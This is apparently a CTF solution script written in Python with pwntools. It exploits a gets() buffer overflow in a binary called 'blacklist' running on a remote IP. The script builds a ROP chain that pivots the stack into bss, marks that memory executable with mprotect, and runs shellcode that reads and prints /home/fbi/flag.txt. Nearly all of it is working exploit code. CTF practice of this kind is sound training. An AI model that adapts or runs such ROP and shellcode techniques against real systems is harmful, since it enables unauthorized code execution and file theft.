from pwn import *
import string

context.arch = 'amd64'

script = '''
break *vuln+29
continue
'''

# Print out contents (only up to 0x50 bytes of it though for some reason :/) of a file.
shellcode = asm('''

    mov rax, 0x101
    mov rsi, rdi
    xor rdi, rdi
    xor rdx, rdx
    xor r10, r10
    syscall
    
    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    mov rdx, 0x50
    syscall
    
    mov rax, 1
    mov rdi, 0
    syscall

        ''')

def main():
    
    # For our socket shellcode. 
    dataseg = 0x00000000004dd000
    # Just inside read()
    syscall = 0x457a00
    # For stack pivot, because fuck gets()
    pop_rbp = 0x41ed8f
    leave = 0x0000000000401e78

    rop = ROP("./blacklist")
    elf = ELF("./blacklist")
    
    # This is effected by bachars bcuz gets(), so im gonna load a stage2.
    ropchain = flat(
        
        # I CBA dealing with the stack, so bss instead :)
        # read(0, dataseg, 0x1000)
        rop.rdi.address,                                                  
        0,   
        rop.rsi.address,
        dataseg,
        rop.rdx.address,
        0x1000,
        syscall,

        pop_rbp,
        dataseg+0x20, # +0x20 to leave room for filenames n shit
        leave,
            )
    
    # This is not affected by badchars, bcuz read() :).
    rop2 = flat(
        
        path := b"/home/fbi/flag.txt\x00",
        b"A"*(0x20 - (len(path) - 8)),
        
        # shellcode here because rop is annoying. 
        # mprotect(dataseg, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
        rop.rax.address,
        0x0a,
        rop.rdi.address,
        dataseg,
        rop.rsi.address,
        0x1000,
        rop.rdx.address,
        7,
        syscall,
        
        # Return into our shellcode...
        # Should srop into the somsled somewhere inside the GOT.
        dataseg+125,
        b"\x90"*50,
        shellcode,
        )

    #p = process("./blacklist")
    # nc 40.71.72.198 1236 
    p = remote("40.71.72.198", 1236)
    #gdb.attach(p, script)

    p.sendline(b"A"*72 + ropchain)

    # read() doesnt need a newline 
    p.send(rop2)
    
    # We should be recieving some data over stdin, which uses the same socket as stdout for comms with the server. So
    # pretty much no difference between the 2.
    buf = p.recvall()

    # Clean output a lil 
    printable = ""
    for b in buf:
        for c in string.printable:
            if b == ord(c):
                printable += chr(b)

    print(printable)


if __name__ == "__main__":
    main()
